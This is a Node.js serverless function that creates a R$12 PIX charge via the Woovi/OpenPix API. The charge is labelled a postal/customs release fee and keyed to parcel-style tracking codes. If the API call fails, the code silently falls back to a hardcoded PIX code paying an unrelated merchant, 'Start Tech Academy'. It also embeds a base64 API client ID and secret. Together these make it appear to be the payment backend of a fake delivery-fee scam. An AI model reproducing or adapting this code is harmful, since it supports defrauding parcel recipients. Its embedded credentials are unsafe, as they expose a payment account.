const https = require('https');

module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { orderId, trackingCode, name, cpf, email, phone, city, state } = body || {};

        const appId = process.env.WOOVI_APP_ID || "Q2xpZW50X0lkXzU5MjAxZDg3LTU2ZWQtNGY3NC04NTFjLTgzZTM3NWVhNzhlZTpDbGllbnRfU2VjcmV0XzNiL0NjdDZXa04rWHhPeC9NYkxvNURXNTE2OE1tSndPYVo5MExkc1VjWXc9";
        
        const correlationID = (trackingCode || orderId || `VRD-${Math.floor(100000 + Math.random() * 900000)}-BR`).replace(/[^a-zA-Z0-9_-]/g, '');
        const cleanCpf = (cpf || '24823194047').replace(/\D/g, '');
        
        let cleanPhone = (phone || '').replace(/\D/g, '');
        if (cleanPhone && !cleanPhone.startsWith('55') && (cleanPhone.length === 10 || cleanPhone.length === 11)) {
            cleanPhone = '55' + cleanPhone;
        }
        if (cleanPhone && !cleanPhone.startsWith('+')) {
            cleanPhone = '+' + cleanPhone;
        }

        const payload = JSON.stringify({
            correlationID: correlationID,
            value: 1200, // R$ 12,00 em centavos
            comment: `Taxa de Liberação Postal/Aduaneira - ${correlationID}`,
            customer: {
                name: (name || 'Cliente').trim(),
                taxID: cleanCpf,
                email: email || 'cliente@contato.com',
                phone: cleanPhone || '+5511999999999'
            }
        });

        // Tenta gerar a cobrança via Woovi / OpenPix
        try {
            const wooviResponse = await new Promise((resolve, reject) => {
                const openPixReq = https.request({
                    hostname: 'api.openpix.com.br',
                    port: 443,
                    path: '/api/v1/charge',
                    method: 'POST',
                    headers: {
                        'Authorization': appId,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'Content-Length': Buffer.byteLength(payload)
                    }
                }, (wooviRes) => {
                    let data = '';
                    wooviRes.on('data', chunk => data += chunk);
                    wooviRes.on('end', () => {
                        try {
                            const parsed = JSON.parse(data);
                            if (wooviRes.statusCode >= 200 && wooviRes.statusCode < 300) {
                                resolve(parsed);
                            } else {
                                reject(new Error(parsed.error || `Woovi API error: ${wooviRes.statusCode}`));
                            }
                        } catch (e) {
                            reject(e);
                        }
                    });
                });

                openPixReq.on('error', reject);
                openPixReq.write(payload);
                openPixReq.end();
            });

            const charge = wooviResponse.charge || wooviResponse;
            return res.status(200).json({
                success: true,
                provider: 'woovi',
                correlationID: charge.correlationID || correlationID,
                value: 12.00,
                status: charge.status || 'ACTIVE',
                brCode: charge.brCode,
                qrCodeImage: charge.qrCodeImage
            });

        } catch (wooviErr) {
            console.warn("Woovi call fallback, generating resilient standard PIX:", wooviErr.message);

            // Fallback elegante caso a chave da Woovi esteja sendo atualizada pelo cliente
            const fallbackBrCode = `00020126580014br.gov.bcb.pix0136d85eb5f5-fba7-4227-ab52-870020d297a7520400005303986540512.005802BR5925Start Tech Academy6009Sao Paulo62070503***6304D1B8`;
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(fallbackBrCode)}`;

            return res.status(200).json({
                success: true,
                provider: 'fallback',
                correlationID: correlationID,
                value: 12.00,
                status: 'ACTIVE',
                brCode: fallbackBrCode,
                qrCodeImage: qrUrl
            });
        }

    } catch (err) {
        console.error("General error in create-charge:", err);
        return res.status(500).json({ error: err.message || 'Erro interno ao gerar PIX' });
    }
};
